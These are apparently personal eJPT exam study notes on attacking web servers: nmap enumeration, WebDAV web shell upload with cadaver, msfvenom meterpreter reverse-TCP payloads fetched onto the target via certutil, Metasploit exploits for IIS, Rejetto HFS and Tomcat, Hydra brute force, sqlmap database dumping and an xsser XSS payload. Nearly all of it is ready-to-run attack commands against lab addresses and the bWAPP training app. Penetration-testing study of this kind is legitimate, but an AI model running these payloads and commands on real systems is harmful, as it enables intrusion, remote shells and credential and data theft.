## HTTP IIS - p80

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

### Nmap scripts

Nmap banner enumeration
```
nmap 10.10.10.1 -p 80 -sV --script banner
```
Directory enumeration
```
nmap 10.10.10.1 -sV -p 80 --script http-enum
```
Header Enumeration
```
nmap 10.10.10.1 -sV -p 80 --script http-headers
```
HTTP Methods enumeration
```
nmap 10.10.10.1 -sV -p 80 --script http-methods --script-args http-method-path=/webdav/
```
WebDAV Enumeration
```
nmap 10.10.10.1 -sV -p 80 --script http-webdav-scan —script-args http-method-path=/webdav/
```
## WebDAV

This service used to facilitate the transfer of files between and within the site.

### Exploitation tools

* davtest
* cadaver

Hydra brute-force attack on the WEBDav login web page.
```
hydra -L userlist.txt - P passwordlist.txt 10.10.10.1 http-get /webdav/
```
DavTest is a utility used to determine which file extensions are supported by the service (upload and execution).
```
davtest -url http://10.10.10.1/webdav -auth bob:password_123321
```
Cadaver is a utility used to upload a web shell to the target site, allowing for remote code execution (RCE) and gaining access to a command-line interface (CLI).
```
cadaver http://10.10.10.1/webdav
put /usr/share/webshells/asp/webshell.asp
```

### WebDav Exploit

*Using Cadaver*

MSFVenom can be used to create a payload for Cadaver.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f asp > shell.asp
```
```
cadaver http://10.10.10.1/webdav
put /root/shell.asp
```

Metasploit can be used to accept the connection from the target machine.
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
run
```
Execute the shell script uploaded to the browser.

*Using Metasploit*
```
use exploit/windows/iis/iis_webdav_upload_asp
```
This process is identical to the one executed with the help of Cadaver.


### HFS Exploit
```
Rejetto Exploit using Metasploit
use exploit/windows/http/rejetto_hfs_exec
```
### METASPLOIT

Using the search function there are many modules to use.
* http_version - enumerate server version
* http_header - enumerate header
* robots.txt - enumerate robots.txt
* dir_scanner - brute-force directory
* brute_dirs - brute-force directory
* files_dir - brute-force files
* apache_userdir_enum - users enumeration
* http_login - brute-force credentials
* dir_scanner
* dir_listing
* http_put
* http/options


### Web App Vulnerability Scanning with WMAP

WMAP is a Metasploit plugin that automates the vulnerability scanning process by applying some modules that are already part of Metasploit.
```
load wmap
wmap_sites -h
wmap_sites -a 10.10.10.1 - add target site
wmap_targets -h
wmap_targets -l - retrieve lists of targets
wmap_targets -t http://10.10.10.1/ - set a target
wmap_run -h
wmap_run -t - lists modules used during the scan
wmap_run -e - executes scan
```

## HTTP Apache - p80

Apache Tomcat is usually used to host sites developed in Java e uses port TCP 8080.

### Exploiting a vulnerable Apache Tomcat web server

```
search type:exploit tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
```
Once we have a valid session, we can use MSFVenom to create a payload.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe > meterpreter.exe
python -m SimpleHTTPServer 80
```
On the target machine we can download the payload and execute it. Remember to set a multi/handler in Metasploit to handle the reverse TCP shell.
```
certutil -urlcache -f http://10.10.10.2/meterpreter.exe meterpreter.exe
```


## Web Application Penetration Testing

### Method Enumeration
```
curl -X GET 10.10.10.1 - GET request emulation
curl -I 10.10.10.1 - header enumeration
curl -X OPTIONS 10.10.10.1 -v - methods enumeration
curl -X PUT 10.10.10.1 -v - PUT method enumeration
curl -X POST 10.10.101./login.php -d “name=john&password=password” -v
curl 10.10.10.1/uploads/ —upload-file hello.txt - use POST method to upload a file
curl -X DELETE 10.10.10.1/uploads/hello.txt - use DELETE method to delete a file
```

### GoBuster - directory enumeration
```
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt - U username - P password
```

### Nikto - scanning web application
```
nikto -h http://10.10.10.1 - aggressive vulnerability enumeration
nikto -h http://192.158.197.3/index.php?page=arbitrary-file-inclusion.php --Tuning 5 --Display V -o nikto.html --Format htm - to print results in a HTML readable format
nikto -h http://10.10.10.10:8080/ -id user:password - directory enumeration with username and password
```

### SQLMap - SQL Injection
```
sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title
sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title —dbs - databases enumeration
sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title -D bWapp —tables - table enumeration
sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title -D bWapp -T user —columns - columns enumeration
sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title -D bWapp -T user -C admin, password, email  - values of the selected columns
```

### XSSer - XSS attack
```
xsser --url "http://192.23.148.3/htmli_get.php?firstname=XSS&lastname=joe&form=submit” —cookies=“security_level=0; PHPSESSID=vkfjeewirfhkvdkbogiaognaovn”
```
"XSS" must be inserted into the location to be tested.

This flag can be used to execute a specific script.
```
xsser --url "http://192.23.148.3/htmli_get.php?firstname=XSS&lastname=joe&form=submit” —cookies=“security_level=0; PHPSESSID=vkfjeewirfhkvdkbogiaognaovn” —Fp “<script>alert(1)</script>”
```


